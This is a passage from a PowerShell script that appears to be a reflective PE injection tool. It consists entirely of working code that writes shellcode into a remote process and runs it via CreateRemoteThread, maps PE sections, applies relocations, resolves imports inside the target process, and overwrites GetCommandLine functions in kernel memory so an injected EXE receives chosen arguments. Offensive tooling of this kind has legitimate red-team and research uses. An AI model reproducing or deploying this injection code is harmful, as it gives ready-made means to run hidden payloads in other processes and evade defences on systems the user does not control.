		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		#Write FunctionName to memory (will be used in GetProcAddress)
		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		#todo: need to have detection for when to get by ordinal
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionName $ProcedureName
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
